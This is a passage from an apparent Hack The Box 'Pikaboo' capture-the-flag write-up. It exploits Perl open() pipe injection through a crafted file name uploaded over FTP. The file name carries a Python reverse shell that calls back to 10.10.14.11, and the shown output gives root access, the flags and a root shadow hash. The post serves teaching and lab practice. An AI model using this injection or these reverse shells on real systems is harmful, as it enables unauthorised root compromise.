class="line">  <span class="string">&#x27;characteristics&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;characteristic_text&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_episode_names&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_episodes&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_episode_warriors&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_kingdom_names&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_kingdoms&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_max_links&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_move_data&#x27;</span> =&gt; <span class="number">7</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_move_displacement_prose&#x27;</span> =&gt; <span class="number">5</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_move_displacements&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_move_effect_prose&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_move_effects&#x27;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_move_range_prose&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_move_ranges&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_pokemon_abilities&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_pokemon_evolution&#x27;</span> =&gt; <span class="number">8</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_pokemon_moves&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_pokemon_stats&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_stat_names&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_stats&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_transformation_pokemon&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_transformation_warriors&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_warrior_archetypes&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_warrior_names&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_warrior_ranks&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_warrior_rank_stat_map&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_warriors&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_warrior_skill_names&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_warrior_skills&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_warrior_specialties&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_warrior_stat_names&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_warrior_stats&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;conquest_warrior_transformation&#x27;</span> =&gt; <span class="number">10</span>,</span><br><span class="line">  <span class="string">&#x27;contest_combos&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;contest_effect_prose&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;contest_effects&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;contest_type_names&#x27;</span> =&gt; <span class="number">5</span>,</span><br><span class="line">  <span class="string">&#x27;contest_types&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;egg_group_prose&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;egg_groups&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;encounter_condition_prose&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;encounter_conditions&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;encounter_condition_value_map&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;encounter_condition_value_prose&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;encounter_condition_values&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;encounter_method_prose&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;encounter_methods&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;encounters&#x27;</span> =&gt; <span class="number">7</span>,</span><br><span class="line">  <span class="string">&#x27;encounter_slots&#x27;</span> =&gt; <span class="number">5</span>,</span><br><span class="line">  <span class="string">&#x27;evolution_chains&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;evolution_trigger_prose&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;evolution_triggers&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;experience&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;genders&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;generation_names&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;generations&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;growth_rate_prose&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;growth_rates&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;item_categories&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;item_category_prose&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;item_flag_map&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;item_flag_prose&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;item_flags&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;item_flavor_summaries&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;item_flavor_text&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;item_fling_effect_prose&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;item_fling_effects&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;item_game_indices&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;item_names&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;item_pocket_names&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;item_pockets&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;item_prose&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;items&#x27;</span> =&gt; <span class="number">6</span>,</span><br><span class="line">  <span class="string">&#x27;language_names&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;languages&#x27;</span> =&gt; <span class="number">6</span>,</span><br><span class="line">  <span class="string">&#x27;location_area_encounter_rates&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;location_area_prose&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;location_areas&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;location_game_indices&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;location_names&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;locations&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;machines&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;move_battle_style_prose&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;move_battle_styles&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;move_changelog&#x27;</span> =&gt; <span class="number">10</span>,</span><br><span class="line">  <span class="string">&#x27;move_damage_classes&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;move_damage_class_prose&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;move_effect_changelog&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;move_effect_changelog_prose&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;move_effect_prose&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;move_effects&#x27;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">  <span class="string">&#x27;move_flag_map&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;move_flag_prose&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;move_flags&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;move_flavor_summaries&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;move_flavor_text&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;move_meta_ailment_names&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;move_meta_ailments&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;move_meta_categories&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;move_meta_category_prose&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;move_meta&#x27;</span> =&gt; <span class="number">13</span>,</span><br><span class="line">  <span class="string">&#x27;move_meta_stat_changes&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;move_names&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;moves&#x27;</span> =&gt; <span class="number">15</span>,</span><br><span class="line">  <span class="string">&#x27;move_target_prose&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;move_targets&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;nature_battle_style_preferences&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;nature_names&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;nature_pokeathlon_stats&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;natures&#x27;</span> =&gt; <span class="number">7</span>,</span><br><span class="line">  <span class="string">&#x27;pal_park_area_names&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;pal_park_areas&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;pal_park&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;pokeathlon_stat_names&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;pokeathlon_stats&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;pokedexes&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;pokedex_prose&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;pokedex_version_groups&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_abilities&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_color_names&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_colors&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon&#x27;</span> =&gt; <span class="number">8</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_dex_numbers&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_egg_groups&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_evolution&#x27;</span> =&gt; <span class="number">20</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_form_generations&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_form_names&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_form_pokeathlon_stats&#x27;</span> =&gt; <span class="number">5</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_forms&#x27;</span> =&gt; <span class="number">10</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_form_types&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_game_indices&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_habitat_names&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_habitats&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_items&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_move_method_prose&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_move_methods&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_moves&#x27;</span> =&gt; <span class="number">6</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_shape_prose&#x27;</span> =&gt; <span class="number">5</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_shapes&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_species&#x27;</span> =&gt; <span class="number">20</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_species_flavor_summaries&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_species_flavor_text&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_species_names&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_species_prose&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_stats&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_types&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;pokemon_types_past&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;region_names&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;regions&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;stat_names&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;stats&#x27;</span> =&gt; <span class="number">5</span>,</span><br><span class="line">  <span class="string">&#x27;super_contest_combos&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;super_contest_effect_prose&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;super_contest_effects&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;type_efficacy&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;type_game_indices&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;type_names&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;types&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;version_group_pokemon_move_methods&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;version_group_regions&#x27;</span> =&gt; <span class="number">2</span>,</span><br><span class="line">  <span class="string">&#x27;version_groups&#x27;</span> =&gt; <span class="number">4</span>,</span><br><span class="line">  <span class="string">&#x27;version_names&#x27;</span> =&gt; <span class="number">3</span>,</span><br><span class="line">  <span class="string">&#x27;versions&#x27;</span> =&gt; <span class="number">3</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($#ARGV &lt; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">die</span> <span class="string">&quot;Usage: $0 &lt;type&gt; &lt;file(s)&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $type = $ARGV[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">exists</span> $csv_fields&#123;$type&#125;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">die</span> <span class="string">&quot;Unrecognised CSV data type: $type.\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $csv = Text::CSV-&gt;new(&#123; <span class="string">sep_char =&gt;</span> <span class="string">&#x27;,&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $fname = <span class="string">&quot;<span class="subst">$&#123;csv_dir&#125;</span>/<span class="subst">$&#123;type&#125;</span>.csv&quot;</span>;</span><br><span class="line"><span class="keyword">open</span>(<span class="keyword">my</span> $fh, <span class="string">&quot;&gt;&gt;&quot;</span>, $fname) <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">&quot;Unable to open CSV target file.\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">shift</span>;</span><br><span class="line"><span class="keyword">for</span>(&lt;&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">chomp</span>;</span><br><span class="line">  <span class="keyword">if</span>($csv-&gt;parse($_))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">my</span> @fields = $csv-&gt;fields();</span><br><span class="line">    <span class="keyword">if</span>(@fields != $csv_fields&#123;$type&#125;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">warn</span> <span class="string">&quot;Incorrect number of fields: &#x27;$_&#x27;\n&quot;</span>;</span><br><span class="line">      <span class="keyword">next</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">print</span> $fh <span class="string">&quot;$_\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">close</span>($fh);</span><br></pre></td></tr></table></figure>
+
+<p>Looking through the perl script we can see takes the file name as argument.</p>
+<p>Looking for the vulnerability in perl file open.</p>
+<p>I came across this question in stackoverflow.</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMjY2MTQzNDgvcGVybC1vcGVuLWluamVjdGlvbi1wcmV2ZW50aW9u">https://stackoverflow.com/questions/26614348/perl-open-injection-prevention<i class="fa fa-external-link-alt"></i></span></p>
+<p>which than increased my curosity to learn more as answer didn’t explain a good way to exploit and looking for the exploit for that I stumbled upon this article.</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly93aWtpLnNlaS5jbXUuZWR1L2NvbmZsdWVuY2UvcGFnZXMvdmlld3BhZ2UuYWN0aW9uP3BhZ2VJZD04ODg5MDU0Mw==">https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88890543<i class="fa fa-external-link-alt"></i></span></p>
+<p>which explained the exploit in detailed.</p>
+<p>The exploit basically is that if the filename starts with ‘|’ then the rest of file name will be executed as command rather than the file name itself so I build up a payload for that.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((\&quot;10.10.14.11\&quot;,1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\&quot;sh\&quot;)&#x27;</span>;echo .csv</span><br></pre></td></tr></table></figure>
+
+<p>So this is the file name that I come up with and I will tell why this shell as the command is passed through basename so ant ‘&#x2F;‘ will just split the payload and mess with the working of the payload.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Pikaboo$ <span class="built_in">basename</span> <span class="string">&#x27;/bin/bash&#x27;</span></span><br><span class="line">bash</span><br></pre></td></tr></table></figure>
+
+<p>So as we can see above we cannot use the bash payload as due to below.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Pikaboo$ <span class="built_in">basename</span> <span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.11/12345 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line">12345 0&gt;&amp;1<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>So basically it will just send ‘12345 0&gt;&amp;1’ to the perl script and your payload cannot execute so thats why I chose python payload.<br>So let’s create the file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Pikaboo$ <span class="built_in">touch</span> <span class="string">&quot;|python3 -c &#x27;import os,pty,socket;s=socket.socket();s.connect((\&quot;10.10.14.11\&quot;,1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\&quot;sh\&quot;)&#x27;;echo .csv&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>and we need .csv at the as to bypass the check in the bash script.<br>Now let’s upload the file but before that start the nc listener on that port.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Pikaboo$ ftp 10.10.10.249</span><br><span class="line">Connected to pikaboo.htb.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (pikaboo.htb:kali): pwnmeow</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; <span class="built_in">cd</span> versions</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; put oops <span class="string">&quot;|python3 -c &#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;</span>\&quot;10.10.14.11\&quot;,1234));[os.dup2(s.fileno(),f)<span class="keyword">for</span>\ f\ <span class="keyword">in</span>(0,1,2)];pty.spawn(<span class="string">&quot;&quot;</span>\&quot;sh\&quot;)<span class="string">&#x27;;.csv&quot;</span></span><br><span class="line"><span class="string">local: oops remote: |python3 -c &#x27;</span>import os,pty,socket;s=socket.socket();s.connect((\&quot;<span class="number">10.10</span>.<span class="number">14.11</span>\&quot;,<span class="number">1234</span>));[os.dup2(s.fileno(),f)<span class="keyword">for</span> f <span class="keyword">in</span>(0,1,2)];pty.spawn(<span class="string">&quot;sh&quot;</span>)<span class="string">&#x27;;.csv</span></span><br><span class="line"><span class="string">200 PORT command successful. Consider using PASV.</span></span><br><span class="line"><span class="string">150 Ok to send data.</span></span><br><span class="line"><span class="string">226 Transfer complete.</span></span><br><span class="line"><span class="string">ftp&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>After uploading file please wait for sometime as it can take a while.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/pikaboo]</span><br><span class="line">└─<span class="comment"># rlwrap nc -nlvp 1234</span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::1234</span><br><span class="line">Ncat: Listening on 0.0.0.0:1234</span><br><span class="line">Ncat: Connection from 10.10.10.249.</span><br><span class="line">Ncat: Connection from 10.10.10.249:58646.</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">pwnmeow</span><br><span class="line"><span class="built_in">cd</span> pwnmeow</span><br><span class="line"><span class="built_in">cd</span> pwnmeow</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">cb47b6a019e8819d1878916f455df5d7</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cat</span> root.txt</span><br><span class="line"><span class="built_in">cat</span> root.txt</span><br><span class="line">b74d229c4d4f28e7c813a07e5255d456</span><br><span class="line"><span class="built_in">cat</span> /etc/shadow | grep root</span><br><span class="line"><span class="built_in">cat</span> /etc/shadow | grep root</span><br><span class="line">root:$6$rmBpCrNSohpbrXpW<span class="variable">$6XizSEcAl0ELQH28F21</span>.V0cvZgWCNkatRbXCv5WNlIW2mkhECPM7wm1j.BRD.t7.Z5CQPvu19EGORXbpOnb540:18816:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<p>And boom we are root so let’s get all the flags.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2033.jpg"></li>
+</ul>
+<h3 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h3><ul>
+<li>path traversal via misconfigured nginx alias</li>
+<li>LFI fuzzing with seclists’ LFI-Jhaddix.txt</li>
+<li>ftp log poisoning through lfi to get revshell</li>
+<li>LDAP enumeration with leaked pass</li>
+<li>cronjob and perl open() injection to privesc</li>
+<li>python revshell payload bypass check</li>
+</ul>
+<h3 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h3><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
